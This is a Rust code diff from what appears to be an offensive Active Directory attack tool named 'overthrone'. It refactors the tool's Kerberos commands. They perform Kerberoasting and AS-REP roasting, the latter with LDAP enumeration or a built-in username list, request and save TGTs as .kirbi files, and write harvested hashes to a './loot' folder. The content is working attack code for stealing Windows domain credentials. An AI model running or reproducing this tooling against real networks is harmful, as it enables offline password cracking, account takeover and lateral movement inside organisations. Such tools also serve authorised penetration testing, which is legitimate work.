@@ -1942,7 +1942,8 @@ async fn async_main() -> i32 {
                 Some(checks.clone())
             };
             let mut exit = commands::doctor::run(checks_opt).await;
-            if let Some(dc) = target_dc {
+            let effective_dc = target_dc.as_deref().or(cli.dc_host.as_deref());
+            if let Some(dc) = effective_dc {
                 exit |= crate::commands::doctor::check_dc_connectivity(dc)
                     .await
                     .iter()
@@ -3633,25 +3634,25 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         };
     }
 
-    let creds = match require_creds(cli) {
-        Ok(c) => c,
-        Err(e) => return e,
-    };
     let dc = match require_dc(cli) {
         Ok(d) => d,
         Err(e) => return e,
-    };
-    let (secret, use_hash) = match creds.secret_and_hash_flag() {
-        Ok(s) => s,
-        Err(e) => {
-            banner::print_fail(&e);
-            return 1;
-        }
     };
 
     match action {
         KerberosAction::Roast { spn } => {
             use overthrone_core::proto::kerberos;
+            let creds = match require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let (secret, use_hash) = match creds.secret_and_hash_flag() {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
             // Step 1: Get a TGT
             let tgt =
                 match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
@@ -3752,6 +3753,10 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
             let _ = std::fs::create_dir_all(&loot_dir);
             let output_path = loot_dir.join("asrep_hashes.txt");
             let userlist = userlist.as_deref().or(cli.user_list.as_deref());
+            let dc = match require_dc(cli) {
+                Ok(d) => d,
+                Err(e) => return e,
+            };
 
             let roast_users = |users: Vec<String>, domain: String| {
                 let dc = dc.clone();
@@ -3824,12 +3829,75 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                 return roast_users(users, domain).await;
             }
 
+            let domain = match cli.domain.as_deref() {
+                Some(domain) => domain.to_string(),
+                None => {
+                    banner::print_fail("--domain is required for AS-REP roasting");
+                    return 1;
+                }
+            };
+
+            if let Some((username, secret, use_hash)) =
+                cli.username.as_deref().and_then(|username| {
+                    cli.nt_hash
+                        .as_deref()
+                        .map(|hash| (username.to_string(), hash.to_string(), true))
+                        .or_else(|| {
+                            cli.password
+                                .as_deref()
+                                .map(|password| (username.to_string(), password.to_string(), false))
+                        })
+                })
+            {
+                let hunt_config = overthrone_hunter::HuntConfig {
+                    dc_ip: dc.clone(),
+                    domain: domain.clone(),
+                    username,
+                    secret,
+                    use_hash,
+                    base_dn: None,
+                    use_ldaps: false,
+                    output_dir: loot_dir.clone(),
+                    concurrency: 10,
+                    timeout: 30,
+                    jitter_ms: 0,
+                    tgt: None,
+                };
+                let ac = overthrone_hunter::asreproast::AsRepRoastConfig {
+                    output_file: Some(output_path.clone()),
+                    ..Default::default()
+                };
+
+                match overthrone_hunter::asreproast::run(&hunt_config, &ac).await {
+                    Ok(result) => {
+                        if result.hashes.is_empty() {
+                            banner::print_fail("No AS-REP roastable accounts found");
+                            return 1;
+                        }
+                        banner::print_success(&format!(
+                            "{} AS-REP hashes written to {}",
+                            result.hashes.len(),
+                            output_path.display()
+                        ));
+                        return 0;
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("AS-REP roast failed: {}", e));
+                        return 1;
+                    }
+                }
+            }
+
+            banner::print_warn(
+                "No explicit LDAP bind credentials supplied; using embedded username fallback for AS-REP roasting.",
+            );
+            let users = overthrone_hunter::userenum::embedded_usernames();
+            return roast_users(users, domain).await;
+        }
+        KerberosAction::GetTgs { spn } => {
+            use overthrone_core::proto::kerberos;
             let creds = match require_creds(cli) {
                 Ok(c) => c,
-                Err(e) => return e,
-            };
-            let dc = match require_dc(cli) {
-                Ok(d) => d,
                 Err(e) => return e,
             };
             let (secret, use_hash) = match creds.secret_and_hash_flag() {
@@ -3839,84 +3907,6 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     return 1;
                 }
             };
-
-            // No userlist provided — try LDAP enumeration first, then fall back.
-            let hunt_config = overthrone_hunter::HuntConfig {
-                dc_ip: dc.clone(),
-                domain: creds.domain.clone(),
-                username: creds.username.clone(),
-                secret: secret.clone(),
-                use_hash,
-                base_dn: None,
-                use_ldaps: false,
-                output_dir: loot_dir.clone(),
-                concurrency: 10,
-                timeout: 30,
-                jitter_ms: 0,
-                tgt: None,
-            };
-            let ac = overthrone_hunter::asreproast::AsRepRoastConfig {
-                output_file: Some(output_path.clone()),
-                ..Default::default()
-            };
-
-            match overthrone_hunter::asreproast::run(&hunt_config, &ac).await {
-                Ok(result) => {
-                    if result.hashes.is_empty() {
-                        banner::print_fail("No AS-REP roastable accounts found");
-                        return 1;
-                    }
-                    banner::print_success(&format!(
-                        "{} AS-REP hashes written to {}",
-                        result.hashes.len(),
-                        output_path.display()
-                    ));
-                    return 0;
-                }
-                Err(e) => {
-                    banner::print_warn(&format!(
-                        "LDAP enumeration failed: {}. Falling back to embedded list.",
-                        e
-                    ));
-                }
-            }
-
-            let users = overthrone_hunter::userenum::embedded_usernames();
-            return roast_users(users, creds.domain.clone()).await;
-        }
-        KerberosAction::GetTgt => {
-            use overthrone_core::proto::kerberos;
-            match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
-                .await
-            {
-                Ok(tgt) => {
-                    println!(
-                        "{} TGT for {}@{} (expires: {:?})",
-                        "✓".green(),
-                        tgt.client_principal.cyan(),
-                        tgt.client_realm.cyan(),
-                        tgt.end_time
-                    );
-                    // Save ticket to ./loot/
-                    let loot_dir = std::path::PathBuf::from("./loot");
-                    let _ = std::fs::create_dir_all(&loot_dir);
-                    let kirbi_path = loot_dir.join(format!("{}_tgt.kirbi", creds.username));
-                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
-                        use kerberos_asn1::Asn1Object;
-                        use std::io::Write;
-                        let _ = f.write_all(&tgt.ticket.build());
-                        println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
-                    }
-                    banner::print_success("TGT obtained");
-                }
-                Err(e) => {
-                    banner::print_fail(&format!("TGT request failed: {}", e));
-                    return 1;
-                }
-            }
-        }
-        KerberosAction::GetTgs { spn } => {
-            use overthrone_core::proto::kerberos;
             // Get TGT first
             let tgt =
                 match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
@@ -3946,6 +3936,49 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                 }
                 Err(e) => {
                     banner::print_fail(&format!("TGS request failed: {}", e));
+                    return 1;
+                }
+            }
+        }
+        KerberosAction::GetTgt => {
+            use overthrone_core::proto::kerberos;
+            let creds = match require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let (secret, use_hash) = match creds.secret_and_hash_flag() {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+
+            match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
+                .await
+            {
+                Ok(tgt) => {
+                    println!(
+                        "{} TGT obtained for {}@{}",
+                        "✓".green(),
+                        tgt.client_principal.cyan(),
+                        tgt.client_realm.cyan()
+                    );
+
+                    let loot_dir = std::path::PathBuf::from("./loot");
+                    let _ = std::fs::create_dir_all(&loot_dir);
+                    let kirbi_path = loot_dir.join("tgt.kirbi");
+                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
+                        use kerberos_asn1::Asn1Object;
+                        use std::io::Write;
+                        let _ = f.write_all(&tgt.ticket.build());
+                        println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
+                    }
+                    banner::print_success("TGT obtained");
+                    return 0;
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("TGT request failed: {}", e));
                     return 1;
                 }
             }
